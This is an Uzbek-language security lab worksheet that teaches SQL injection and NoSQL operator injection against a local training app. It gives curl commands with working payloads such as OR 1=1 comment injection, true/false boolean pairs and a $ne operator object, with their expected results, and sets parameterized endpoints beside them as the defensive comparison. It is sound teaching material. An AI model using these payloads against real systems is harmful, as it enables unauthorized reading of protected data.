Himoya qatlamlari
SQL uchun asosiy tuzatish — parametrli so‘rov. Apostrofni taqiqlash qonuniy nomlarni buzadi; xato xabarini yashirish esa so‘rov mantiqini tuzatmaydi. [1]

Ishlab chiqarish bazasida ilova hisobiga faqat zarur huquqlar beriladi. Stored procedure ichida ham xavfli dinamik SQL tuzilsa inyeksiya saqlanib qoladi. [1]
Ushbu variant chegarasi. Asosiy tajriba SQL mantiqini o‘zgartirish, ORM xom SQLi va NoSQL operator kiritmasidir. Qo‘shimcha UNION sinovi berilgan. Time-based blind SQLi bu SQLite laboratoriyasida bajarilmaydi: SQLite standartida MySQLdagi SLEEP() funksiyasi yo‘q.

1.3. SQL inyeksiyani aniqlash va sababini izohlash
2-topshiriq. /sql/weak endpointiga quyidagi kiritmani yuboring. Oddiy ASCII apostrof va oxirgi -- izoh belgilaridan foydalaning; uzun tipografik tire ishlatmang.
curl --noproxy "*" -i -G http://127.0.0.1:8005/sql/weak \  --data-urlencode "name=Daftar' OR 1=1 -- "
Kutiladigan natija: HTTP 200, count=4, IDlar 1, 2, 3, 4. Koddagi zaif so‘rov quyidagicha o‘zgaradi:
SELECT id, name, public FROM productsWHERE name = 'Daftar' OR 1=1 -- ' AND public = 1
Apostrof matn literalini yakunlaydi. OR 1=1 shartni barcha qatorlar uchun rost qiladi; -- qator oxirigacha qolgan qismni izohga aylantiradi. Natijada public = 1 filtri bajarilmaydi va ID=4 ham chiqadi. Bu laboratoriyadagi yopiq yozuvni o‘qish cheklovi buzilganining dalilidir.
True/false juftligi
curl --noproxy "*" -i -G http://127.0.0.1:8005/sql/weak \  --data-urlencode "name=Daftar' AND 1=1 -- "curl --noproxy "*" -i -G http://127.0.0.1:8005/sql/weak \  --data-urlencode "name=Daftar' AND 1=2 -- "
Birinchi javob count=1, ID=1; ikkinchisi count=0. Natija mantiqiy shartga bog‘liq o‘zgarganini ko‘rsating. Bu endpoint qatorlarni ochiq qaytaradi: tajribani to‘liq “blind SQLi” deb nomlamang; u mantiqiy ta’sirni ko‘rsatadi.
Parametrli so‘rov bilan taqqoslash
curl --noproxy "*" -i -G http://127.0.0.1:8005/sql/safe \  --data-urlencode "name=Daftar' OR 1=1 -- "curl --noproxy "*" -i -G http://127.0.0.1:8005/sql/safe \  --data-urlencode "name=O'quv qo'llanma"
Himoyalangan endpointda birinchi so‘rov HTTP 200 va count=0: butun kiritmaga teng mahsulot yo‘q. Ikkinchisi HTTP 200 va count=1, ID=3: apostroflar qonuniy ma’lumot sifatida ishladi. Shu apostrofli nomni /sql/weak orqali yuborsangiz HTTP 400 va umumiy xato javobi keladi.
Dalil D2–D3. OR natijasidagi ID=4ni, true/false juftligini va safe endpointdagi ikki natijani saqlang. “Zaiflik yo‘q” xulosasini faqat HTTP 200 yoki xato yo‘qligiga qarab chiqarmang; qaytgan IDlar va countni ham solishtiring.

1.5. NoSQL: matn o‘rnida operator obyekti
4-topshiriq. Quyidagi POST so‘rovlarini bajaring. JSON tanasi Bashda bir tirnoq ichiga olingan: bu $ne ichidagi dollar belgisining shell o‘zgaruvchisi sifatida talqin qilinishini to‘xtatadi. HTTP Content-Type application/json bo‘lishi kerak.
curl --noproxy "*" -i http://127.0.0.1:8005/nosql/weak \  -H 'Content-Type: application/json' \  -d '{"name":"Daftar"}'curl --noproxy "*" -i http://127.0.0.1:8005/nosql/weak \  -H 'Content-Type: application/json' \  -d '{"name":{"$ne":null}}'curl --noproxy "*" -i http://127.0.0.1:8005/nosql/safe \  -H 'Content-Type: application/json' \  -d '{"name":{"$ne":null}}'
Kutiladigan natija. Oddiy nom: HTTP 200, count=1, ID=1. Zaif endpointga operatorli obyekt: HTTP 200, count=3, IDlar 1, 2, 3. Himoyalangan endpointga shu obyekt: HTTP 400, name matn bo‘lishi kerakligi haqidagi error.
